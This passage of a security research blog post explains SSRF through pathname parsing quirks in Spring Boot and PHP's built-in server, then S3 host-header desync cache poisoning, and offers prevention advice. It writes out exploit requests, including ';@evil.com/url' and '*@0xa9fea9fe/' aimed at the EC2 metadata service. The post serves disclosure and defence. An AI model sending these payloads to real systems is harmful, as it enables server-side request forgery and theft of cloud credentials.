<p><img loading="lazy" src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/fe166abf-b2cb-41be-846b-11ac56b33d71.png" alt="" class="image--center mx-auto"></p>
<h2 id="heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation" class="permalink-heading"><a class="permalink-heading-button" title="Permalink" href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation" data-clipboard-text="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation" style="height: 40px;"><span class="hidden">Permalink</span><svg class="h-4 w-4 fill-current dark:text-white" viewBox="0 0 512 512"><path d="M301.148 394.702l-79.2 79.19c-50.778 50.799-133.037 50.824-183.84 0-50.799-50.778-50.824-133.037 0-183.84l79.19-79.2a132.833 132.833 0 013.532-3.403c7.55-7.005 19.795-2.004 20.208 8.286.193 4.807.598 9.607 1.216 14.384.481 3.717-.746 7.447-3.397 10.096-16.48 16.469-75.142 75.128-75.3 75.286-36.738 36.759-36.731 96.188 0 132.94 36.759 36.738 96.188 36.731 132.94 0l79.2-79.2.36-.36c36.301-36.672 36.14-96.07-.37-132.58-8.214-8.214-17.577-14.58-27.585-19.109-4.566-2.066-7.426-6.667-7.134-11.67a62.197 62.197 0 012.826-15.259c2.103-6.601 9.531-9.961 15.919-7.28 15.073 6.324 29.187 15.62 41.435 27.868 50.688 50.689 50.679 133.17 0 183.851zm-90.296-93.554c12.248 12.248 26.362 21.544 41.435 27.868 6.388 2.68 13.816-.68 15.919-7.28a62.197 62.197 0 002.826-15.259c.292-5.003-2.569-9.604-7.134-11.67-10.008-4.528-19.371-10.894-27.585-19.109-36.51-36.51-36.671-95.908-.37-132.58l.36-.36 79.2-79.2c36.752-36.731 96.181-36.738 132.94 0 36.731 36.752 36.738 96.181 0 132.94-.157.157-58.819 58.817-75.3 75.286-2.651 2.65-3.878 6.379-3.397 10.096a163.156 163.156 0 011.216 14.384c.413 10.291 12.659 15.291 20.208 8.286a131.324 131.324 0 003.532-3.403l79.19-79.2c50.824-50.803 50.799-133.062 0-183.84-50.802-50.824-133.062-50.799-183.84 0l-79.2 79.19c-50.679 50.682-50.688 133.163 0 183.851z"></path></svg></a>SSRF on Spring Boot Through Incorrect Pathname Interpretation</h2>
<p>Upon discovering the presence of an SSRF vulnerability in Flask, I delved into exploring how this behavior could be exploited in other frameworks. As my research progressed, it became apparent that Spring Boot is also susceptible to this particular issue.</p>
<p>Authentication bypasses, ACL bypasses, and path traversal are known vectors when the application parses Matrix parameters. Servlet matrix parameters are a feature introduced in the Servlet specification that allows you to extract and handle additional data present in the URL path. Unlike query parameters that are separated by the <code>?</code> character, matrix parameters are separated by the <code>;</code> character within the URL.</p>
<p>During the research, I discovered that the Spring framework accepts the matrix parameter separator character <code>;</code> before the first slash of the HTTP pathname:</p>
<div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><pre><code class="lang-http"><span class="hljs-keyword">GET</span> <span class="hljs-string">;1337/api/v1/me</span> HTTP/1.1
<span class="hljs-attribute">Host</span>: target.com
<span class="hljs-attribute">Connection</span>: close
</code></pre></div></div>
<p>If a developer implements a server-side request that utilizes the complete pathname of the request to fetch an endpoint, it can lead to the emergence of Server-Side Request Forgery (SSRF).</p>
<p>Please consider the following source code as a reference for the exploitation scenario:</p>
<p><img loading="lazy" src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/5661fff8-9e48-4c63-b78b-cb69ee0582c0.png" alt="" class="image--center mx-auto"></p>
<p>The code snippet above utilizes the <code>HttpServletRequest</code> API to retrieve the requested URL through the <code>getRequestURI()</code> function. Subsequently, it concatenates the requested URI with the destination endpoint <a href="http://ifconfig.me/" class="autolinkedURL autolinkedURL-url" target="_blank">ifconfig.me</a>.</p>
<p>Considering that Spring permits any character following the Matrix parameter separator, becoming possible to use the <code>@</code> character to fetch an arbitrary endpoint as well.</p>
<p>Below is an example of the exploit request:</p>
<div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><pre><code class="lang-http"><span class="hljs-keyword">GET</span> <span class="hljs-string">;@evil.com/url</span> HTTP/1.1
<span class="hljs-attribute">Host</span>: target.com
<span class="hljs-attribute">Connection</span>: close
</code></pre></div></div>
<p><img loading="lazy" src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/e66a9edf-a590-4d82-b75a-180c33ae1a21.png" alt="" class="image--center mx-auto"></p>
<h2 id="heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation" class="permalink-heading"><a class="permalink-heading-button" title="Permalink" href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation" data-clipboard-text="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation" style="height: 40px;"><span class="hidden">Permalink</span><svg class="h-4 w-4 fill-current dark:text-white" viewBox="0 0 512 512"><path d="M301.148 394.702l-79.2 79.19c-50.778 50.799-133.037 50.824-183.84 0-50.799-50.778-50.824-133.037 0-183.84l79.19-79.2a132.833 132.833 0 013.532-3.403c7.55-7.005 19.795-2.004 20.208 8.286.193 4.807.598 9.607 1.216 14.384.481 3.717-.746 7.447-3.397 10.096-16.48 16.469-75.142 75.128-75.3 75.286-36.738 36.759-36.731 96.188 0 132.94 36.759 36.738 96.188 36.731 132.94 0l79.2-79.2.36-.36c36.301-36.672 36.14-96.07-.37-132.58-8.214-8.214-17.577-14.58-27.585-19.109-4.566-2.066-7.426-6.667-7.134-11.67a62.197 62.197 0 012.826-15.259c2.103-6.601 9.531-9.961 15.919-7.28 15.073 6.324 29.187 15.62 41.435 27.868 50.688 50.689 50.679 133.17 0 183.851zm-90.296-93.554c12.248 12.248 26.362 21.544 41.435 27.868 6.388 2.68 13.816-.68 15.919-7.28a62.197 62.197 0 002.826-15.259c.292-5.003-2.569-9.604-7.134-11.67-10.008-4.528-19.371-10.894-27.585-19.109-36.51-36.51-36.671-95.908-.37-132.58l.36-.36 79.2-79.2c36.752-36.731 96.181-36.738 132.94 0 36.731 36.752 36.738 96.181 0 132.94-.157.157-58.819 58.817-75.3 75.286-2.651 2.65-3.878 6.379-3.397 10.096a163.156 163.156 0 011.216 14.384c.413 10.291 12.659 15.291 20.208 8.286a131.324 131.324 0 003.532-3.403l79.19-79.2c50.824-50.803 50.799-133.062 0-183.84-50.802-50.824-133.062-50.799-183.84 0l-79.2 79.19c-50.679 50.682-50.688 133.163 0 183.851z"></path></svg></a>PHP Built-in Web Server Case Study - SSRF Through Incorrect Pathname Interpretation</h2>
<p>The PHP Built-in web server suffers from the same vulnerability. Still, the Built-in server is not used in production involvements, so I decided to present this behavior as a case study that is unlikely to happen in real-world applications.</p>
<p>Surprisingly, PHP allows the asterisk <code>*</code> character before the first slash in the pathname, and between the asterisk and the first slash, almost all ASCII characters are accepted as valid HTTP request.</p>
<p>However, there are two limitations that arise with PHP:</p>
<ol>
<li><p>This technique can only be used for the root pathname <code>/</code> and cannot be applied to other endpoints, in other words, the vulnerable code must be in the <code>index.php</code> file;</p>
</li>
<li><p>Dots <code>.</code> are not allowed before the first slash, which restricts the inclusion of arbitrary IPs and domains, to circumvent it, the payload must include a dotless-hex encoded IP address of the malicious domain.</p>
</li>
</ol>
<p>Let's consider the following PHP code for this exploitation scenario:</p>
<div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
$site = <span class="hljs-string">"http://ifconfig.me"</span>;
$current_uri = $_SERVER[<span class="hljs-string">'REQUEST_URI'</span>];

$proxy_site = $site.$current_uri;
var_dump($proxy_site);

<span class="hljs-keyword">echo</span> <span class="hljs-string">"\n\n"</span>;

$response = file_get_contents($proxy_site);
var_dump($response);
<span class="hljs-meta">?&gt;</span>
</code></pre></div></div>
<p>The provided code retrieves the HTTP request pathname using <code>$_SERVER['REQUEST_URI']</code> and concatenates it with the destination domain.</p>
<p>For performing IP address dotless-hex encoding, you can utilize the tool <a target="_blank" href="https://gist.github.com/mhmdiaa/2587e2330b87db99c81ace2a190e235f">ip-encoder.py</a>.</p>
<p>The resulting payload used for exploiting which fetches the EC2 metadata is as follows:</p>
<div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><pre><code class="lang-http"><span class="hljs-keyword">GET</span> <span class="hljs-string">*@0xa9fea9fe/</span> HTTP/1.1
<span class="hljs-attribute">Host</span>: target.com
<span class="hljs-attribute">Connection</span>: close
</code></pre></div></div>
<p>In the following proof of concept, I successfully retrieved my EC2 metadata:</p>
<p><img loading="lazy" src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/4ca585ed-37e3-4384-bec0-ba2c6e59e75a.png" alt="" class="image--center mx-auto"></p>
<h2 id="heading-how-to-prevent-1" class="permalink-heading"><a class="permalink-heading-button" title="Permalink" href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-how-to-prevent-1" data-clipboard-text="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-how-to-prevent-1" style="height: 40px;"><span class="hidden">Permalink</span><svg class="h-4 w-4 fill-current dark:text-white" viewBox="0 0 512 512"><path d="M301.148 394.702l-79.2 79.19c-50.778 50.799-133.037 50.824-183.84 0-50.799-50.778-50.824-133.037 0-183.84l79.19-79.2a132.833 132.833 0 013.532-3.403c7.55-7.005 19.795-2.004 20.208 8.286.193 4.807.598 9.607 1.216 14.384.481 3.717-.746 7.447-3.397 10.096-16.48 16.469-75.142 75.128-75.3 75.286-36.738 36.759-36.731 96.188 0 132.94 36.759 36.738 96.188 36.731 132.94 0l79.2-79.2.36-.36c36.301-36.672 36.14-96.07-.37-132.58-8.214-8.214-17.577-14.58-27.585-19.109-4.566-2.066-7.426-6.667-7.134-11.67a62.197 62.197 0 012.826-15.259c2.103-6.601 9.531-9.961 15.919-7.28 15.073 6.324 29.187 15.62 41.435 27.868 50.688 50.689 50.679 133.17 0 183.851zm-90.296-93.554c12.248 12.248 26.362 21.544 41.435 27.868 6.388 2.68 13.816-.68 15.919-7.28a62.197 62.197 0 002.826-15.259c.292-5.003-2.569-9.604-7.134-11.67-10.008-4.528-19.371-10.894-27.585-19.109-36.51-36.51-36.671-95.908-.37-132.58l.36-.36 79.2-79.2c36.752-36.731 96.181-36.738 132.94 0 36.731 36.752 36.738 96.181 0 132.94-.157.157-58.819 58.817-75.3 75.286-2.651 2.65-3.878 6.379-3.397 10.096a163.156 163.156 0 011.216 14.384c.413 10.291 12.659 15.291 20.208 8.286a131.324 131.324 0 003.532-3.403l79.19-79.2c50.824-50.803 50.799-133.062 0-183.84-50.802-50.824-133.062-50.799-183.84 0l-79.2 79.19c-50.679 50.682-50.688 133.163 0 183.851z"></path></svg></a>How to prevent</h2>
<ul>
<li><p>It is essential to consistently employ complete URL domains when concatenating them with user input. For instance, ensure that a trailing slash is added after the domain name, such as <code>http://ifconfig.me/</code>.</p>
</li>
<li><p>Utilizing a reverse proxy that effectively handles HTTP requests. The vulnerabilities mentioned are typically only possible if the framework is used without any additional reverse proxy that verifies the HTTP pathname. In other words, incorporating a reverse proxy can significantly enhance the security of the web application.</p>
</li>
</ul>
<h1 id="heading-http-desync-cache-poisoning-attacks" class="permalink-heading"><a class="permalink-heading-button" title="Permalink" href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-http-desync-cache-poisoning-attacks" data-clipboard-text="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-http-desync-cache-poisoning-attacks" style="height: 48px;"><span class="hidden">Permalink</span><svg class="h-4 w-4 fill-current dark:text-white" viewBox="0 0 512 512"><path d="M301.148 394.702l-79.2 79.19c-50.778 50.799-133.037 50.824-183.84 0-50.799-50.778-50.824-133.037 0-183.84l79.19-79.2a132.833 132.833 0 013.532-3.403c7.55-7.005 19.795-2.004 20.208 8.286.193 4.807.598 9.607 1.216 14.384.481 3.717-.746 7.447-3.397 10.096-16.48 16.469-75.142 75.128-75.3 75.286-36.738 36.759-36.731 96.188 0 132.94 36.759 36.738 96.188 36.731 132.94 0l79.2-79.2.36-.36c36.301-36.672 36.14-96.07-.37-132.58-8.214-8.214-17.577-14.58-27.585-19.109-4.566-2.066-7.426-6.667-7.134-11.67a62.197 62.197 0 012.826-15.259c2.103-6.601 9.531-9.961 15.919-7.28 15.073 6.324 29.187 15.62 41.435 27.868 50.688 50.689 50.679 133.17 0 183.851zm-90.296-93.554c12.248 12.248 26.362 21.544 41.435 27.868 6.388 2.68 13.816-.68 15.919-7.28a62.197 62.197 0 002.826-15.259c.292-5.003-2.569-9.604-7.134-11.67-10.008-4.528-19.371-10.894-27.585-19.109-36.51-36.51-36.671-95.908-.37-132.58l.36-.36 79.2-79.2c36.752-36.731 96.181-36.738 132.94 0 36.731 36.752 36.738 96.181 0 132.94-.157.157-58.819 58.817-75.3 75.286-2.651 2.65-3.878 6.379-3.397 10.096a163.156 163.156 0 011.216 14.384c.413 10.291 12.659 15.291 20.208 8.286a131.324 131.324 0 003.532-3.403l79.19-79.2c50.824-50.803 50.799-133.062 0-183.84-50.802-50.824-133.062-50.799-183.84 0l-79.2 79.19c-50.679 50.682-50.688 133.163 0 183.851z"></path></svg></a>HTTP Desync Cache Poisoning Attacks</h1>
<p>Inconsistencies exist among servers and reverse proxies when it comes to removing invalid invisible characters from header names before interpreting them. This inconsistency can lead to notable vulnerabilities, such as HTTP Request Smuggling. But in this section, I will discuss a vulnerability and technique that I discovered during my research that combines Desync attacks with Cache Poisoning, which affects cache servers when integrated with AWS S3 buckets.</p>
<p>But before we continue, we must understand some functionalities of cache servers.</p>
<h2 id="heading-cache-keys" class="permalink-heading"><a class="permalink-heading-button" title="Permalink" href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-cache-keys" data-clipboard-text="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-cache-keys" style="height: 40px;"><span class="hidden">Permalink</span><svg class="h-4 w-4 fill-current dark:text-white" viewBox="0 0 512 512"><path d="M301.148 394.702l-79.2 79.19c-50.778 50.799-133.037 50.824-183.84 0-50.799-50.778-50.824-133.037 0-183.84l79.19-79.2a132.833 132.833 0 013.532-3.403c7.55-7.005 19.795-2.004 20.208 8.286.193 4.807.598 9.607 1.216 14.384.481 3.717-.746 7.447-3.397 10.096-16.48 16.469-75.142 75.128-75.3 75.286-36.738 36.759-36.731 96.188 0 132.94 36.759 36.738 96.188 36.731 132.94 0l79.2-79.2.36-.36c36.301-36.672 36.14-96.07-.37-132.58-8.214-8.214-17.577-14.58-27.585-19.109-4.566-2.066-7.426-6.667-7.134-11.67a62.197 62.197 0 012.826-15.259c2.103-6.601 9.531-9.961 15.919-7.28 15.073 6.324 29.187 15.62 41.435 27.868 50.688 50.689 50.679 133.17 0 183.851zm-90.296-93.554c12.248 12.248 26.362 21.544 41.435 27.868 6.388 2.68 13.816-.68 15.919-7.28a62.197 62.197 0 002.826-15.259c.292-5.003-2.569-9.604-7.134-11.67-10.008-4.528-19.371-10.894-27.585-19.109-36.51-36.51-36.671-95.908-.37-132.58l.36-.36 79.2-79.2c36.752-36.731 96.181-36.738 132.94 0 36.731 36.752 36.738 96.181 0 132.94-.157.157-58.819 58.817-75.3 75.286-2.651 2.65-3.878 6.379-3.397 10.096a163.156 163.156 0 011.216 14.384c.413 10.291 12.659 15.291 20.208 8.286a131.324 131.324 0 003.532-3.403l79.19-79.2c50.824-50.803 50.799-133.062 0-183.84-50.802-50.824-133.062-50.799-183.84 0l-79.2 79.19c-50.679 50.682-50.688 133.163 0 183.851z"></path></svg></a>Cache Keys</h2>
<p>Cache keys are unique identifiers used by cache servers to store and retrieve cached data, they serve as references or labels that allow access to cached content.</p>
<p>The most frequently used cache key is typically derived from the URL's pathname. When a user sends a request to a server that utilizes caching, the cache server employs the requested URL to locate the corresponding cached response to serve back to the user.</p>
<p><img loading="lazy" src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/430c595b-b7ca-4dec-b31c-58374b1d0a30.webp" alt="" class="image--center mx-auto"></p>
<p>In addition to the URL's pathname, another default cache key is the Host header. Let's consider a scenario where a cached JavaScript file is located at <code>https://target.com/static/main.js</code>. When a user sends an HTTP request to this cached URL, the cache server will return the stored response without having to forward the request to the backend server.</p>
<p>However, if a user sends an HTTP request to the same endpoint but modifies the Host header to <code>1337.target.com</code>, the cache server will attempt to retrieve the backend of the corresponding response for the <code>/static/main.js</code> URL using the <code>1337.target.com</code> host header. Subsequently, it will generate a stored response specifically for that particular HTTP message.</p>
<h2 id="heading-s3-http-desync-cache-poisoning-issue" class="permalink-heading"><a class="permalink-heading-button" title="Permalink" href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-s3-http-desync-cache-poisoning-issue" data-clipboard-text="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-s3-http-desync-cache-poisoning-issue" style="height: 40px;"><span class="hidden">Permalink</span><svg class="h-4 w-4 fill-current dark:text-white" viewBox="0 0 512 512"><path d="M301.148 394.702l-79.2 79.19c-50.778 50.799-133.037 50.824-183.84 0-50.799-50.778-50.824-133.037 0-183.84l79.19-79.2a132.833 132.833 0 013.532-3.403c7.55-7.005 19.795-2.004 20.208 8.286.193 4.807.598 9.607 1.216 14.384.481 3.717-.746 7.447-3.397 10.096-16.48 16.469-75.142 75.128-75.3 75.286-36.738 36.759-36.731 96.188 0 132.94 36.759 36.738 96.188 36.731 132.94 0l79.2-79.2.36-.36c36.301-36.672 36.14-96.07-.37-132.58-8.214-8.214-17.577-14.58-27.585-19.109-4.566-2.066-7.426-6.667-7.134-11.67a62.197 62.197 0 012.826-15.259c2.103-6.601 9.531-9.961 15.919-7.28 15.073 6.324 29.187 15.62 41.435 27.868 50.688 50.689 50.679 133.17 0 183.851zm-90.296-93.554c12.248 12.248 26.362 21.544 41.435 27.868 6.388 2.68 13.816-.68 15.919-7.28a62.197 62.197 0 002.826-15.259c.292-5.003-2.569-9.604-7.134-11.67-10.008-4.528-19.371-10.894-27.585-19.109-36.51-36.51-36.671-95.908-.37-132.58l.36-.36 79.2-79.2c36.752-36.731 96.181-36.738 132.94 0 36.731 36.752 36.738 96.181 0 132.94-.157.157-58.819 58.817-75.3 75.286-2.651 2.65-3.878 6.379-3.397 10.096a163.156 163.156 0 011.216 14.384c.413 10.291 12.659 15.291 20.208 8.286a131.324 131.324 0 003.532-3.403l79.19-79.2c50.824-50.803 50.799-133.062 0-183.84-50.802-50.824-133.062-50.799-183.84 0l-79.2 79.19c-50.679 50.682-50.688 133.163 0 183.851z"></path></svg></a>S3 HTTP Desync Cache Poisoning Issue</h2>
<p>In this section, I will demonstrate an HTTP Desync vulnerability that can result in Cache Poisoning, impacting principally AWS S3 buckets.</p>
<p>In the Amazon AWS S3 buckets, the Host header plays a crucial role in routing requests to the correct bucket and enabling proper access to the stored content. When interacting with an S3 bucket, the Host header helps direct requests to the appropriate endpoint within the AWS infrastructure.</p>
<p>When a request is made to an S3 bucket, the AWS infrastructure inspects the Host header to determine the target bucket. So if a user sends an HTTP request to the domain <code>your.s3.amazonaws.com</code> but changes the host header to <code>my.s3.amazonaws.com</code>, internally, AWS will "ignore" the domain name, fetching the bucket specified in the host header only. This is a common practice on Cloud services.</p>
<h3 id="heading-the-vulnerability" class="permalink-heading"><a class="permalink-heading-button" title="Permalink" href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-the-vulnerability" data-clipboard-text="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-the-vulnerability" style="height: 40px;"><span class="hidden">Permalink</span><svg class="h-4 w-4 fill-current dark:text-white" viewBox="0 0 512 512"><path d="M301.148 394.702l-79.2 79.19c-50.778 50.799-133.037 50.824-183.84 0-50.799-50.778-50.824-133.037 0-183.84l79.19-79.2a132.833 132.833 0 013.532-3.403c7.55-7.005 19.795-2.004 20.208 8.286.193 4.807.598 9.607 1.216 14.384.481 3.717-.746 7.447-3.397 10.096-16.48 16.469-75.142 75.128-75.3 75.286-36.738 36.759-36.731 96.188 0 132.94 36.759 36.738 96.188 36.731 132.94 0l79.2-79.2.36-.36c36.301-36.672 36.14-96.07-.37-132.58-8.214-8.214-17.577-14.58-27.585-19.109-4.566-2.066-7.426-6.667-7.134-11.67a62.197 62.197 0 012.826-15.259c2.103-6.601 9.531-9.961 15.919-7.28 15.073 6.324 29.187 15.62 41.435 27.868 50.688 50.689 50.679 133.17 0 183.851zm-90.296-93.554c12.248 12.248 26.362 21.544 41.435 27.868 6.388 2.68 13.816-.68 15.919-7.28a62.197 62.197 0 002.826-15.259c.292-5.003-2.569-9.604-7.134-11.67-10.008-4.528-19.371-10.894-27.585-19.109-36.51-36.51-36.671-95.908-.37-132.58l.36-.36 79.2-79.2c36.752-36.731 96.181-36.738 132.94 0 36.731 36.752 36.738 96.181 0 132.94-.157.157-58.819 58.817-75.3 75.286-2.651 2.65-3.878 6.379-3.397 10.096a163.156 163.156 0 011.216 14.384c.413 10.291 12.659 15.291 20.208 8.286a131.324 131.324 0 003.532-3.403l79.19-79.2c50.824-50.803 50.799-133.062 0-183.84-50.802-50.824-133.062-50.799-183.84 0l-79.2 79.19c-50.679 50.682-50.688 133.163 0 183.851z"></path></svg></a>The Vulnerability</h3>
<p>The interpretation of host headers for S3 buckets involves two key aspects:</p>
<ol>
<li><p>When multiple host headers are included in the request, only the first one will be taken, and any additional headers will be ignored.</p>
</li>
<li><p>The following bytes are ignored if present in the header name: <code>\x1f</code>, <code>\x1d</code>, <code>\x0c</code>, <code>\x1e</code>, <code>\x1c</code>, <code>\x0b</code>;</p>
</li>
</ol>
<p>The vulnerability arises from an inconsistency in the host header interpretation. If the cache server mistakenly includes the ignored bytes as part of the header name, treating it as an invalid host header, while S3 interprets it as a valid host header, it becomes possible to cache arbitrary bucket responses on vulnerable websites.</p>
<p>This behavior allows caching arbitrary S3 bucket content in vulnerable websites.</p>
<p>Consider the following exploitation request:</p>
<p><img loading="lazy" src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/ffd360e3-5eb8-4ffd-939d-b46614f9f430.png" alt="" class="image--center mx-auto"></p>
